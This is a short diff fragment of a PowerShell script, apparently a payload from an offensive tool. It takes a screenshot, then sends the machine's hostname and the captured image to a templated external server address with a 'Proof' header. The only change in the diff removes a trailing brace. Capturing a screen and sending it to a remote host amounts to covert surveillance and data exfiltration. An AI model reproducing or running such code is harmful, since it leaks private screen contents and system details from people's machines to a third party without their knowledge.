@@ -10,4 +10,4 @@ $bmp.Dispose();
 $URL='SERVER_PROTOCOL://SERVER_EXTERNAL_IP:SERVER_EXTERNAL_PORT/?';
 $headers=@{'Proof'='1'};
 $params=@{hostname=$hostname;screenshot=$screenshot};
-Invoke-WebRequest -Uri $URL -Headers $headers -Method GET -Body $params;};
+Invoke-WebRequest -Uri $URL -Headers $headers -Method GET -Body $params;
